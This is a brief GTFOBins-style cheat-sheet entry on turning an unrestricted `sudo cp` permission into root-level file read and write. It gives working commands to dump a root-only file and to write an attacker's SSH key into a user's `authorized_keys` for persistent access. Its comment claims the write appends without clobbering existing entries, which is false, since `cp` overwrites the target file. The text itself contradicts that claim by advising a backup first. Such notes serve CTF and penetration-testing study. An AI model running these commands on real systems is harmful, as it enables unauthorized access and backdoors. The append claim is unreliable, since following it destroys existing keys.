# sudo cp Arbitrary File Read/Write (GTFOBins)

If `sudo -l` allows `cp` with no argument restrictions, that's unrestricted root file read/write through `/dev/stdin`/`/dev/stdout`.

```bash
# read a protected file
sudo cp /root/root.txt /dev/stdout

# write a file (e.g. append to a user's authorized_keys without clobbering existing entries)
echo "ssh-ed25519 AAAA... you@host" | sudo cp /dev/stdin /home/<user>/.ssh/authorized_keys
```
Back up the target first (`sudo cp /home/<user>/.ssh/authorized_keys /dev/stdout`) if you need to restore it later.
